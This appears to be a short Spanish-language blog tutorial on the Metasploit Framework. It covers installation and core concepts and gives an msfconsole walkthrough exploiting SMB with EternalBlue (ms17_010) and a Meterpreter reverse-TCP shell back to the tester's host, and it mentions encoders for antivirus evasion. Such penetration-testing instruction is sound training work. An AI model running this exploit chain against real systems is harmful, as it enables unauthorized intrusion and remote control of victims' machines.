---
title: "Metasploit Framework Guide"
description: "Guía completa para utilizar Metasploit Framework en testing de penetración"
date: "2026-02-28"
image: "https://via.placeholder.com/240x160?text=Metasploit"
category: "Tools"
---

# Guía Completa de Metasploit Framework

Metasploit es el framework de penetration testing más utilizado en la industria. Aprende a usarlo efectivamente.

## Instalación e Inicio

```bash
# En Kali Linux
msfconsole

# En otros sistemas
sudo msfupdate && msfconsole
```

## Conceptos Básicos

### Exploits
Código que aprovecha una vulnerabilidad específica.

### Payloads
El código que se ejecuta después de explotar una vulnerabilidad.

### Encoders
Evasión de antivirus.

### Listeners
Esperan conexiones reverse shell.

## Ejemplo: Explotación de SMB

```bash
> search ms17-010
> use exploit/windows/smb/ms17_010_eternalblue
> set RHOST target_ip
> set PAYLOAD windows/meterpreter/reverse_tcp
> set LHOST your_ip
> exploit
```

Lee el articulo completo para técnicas avanzadas...
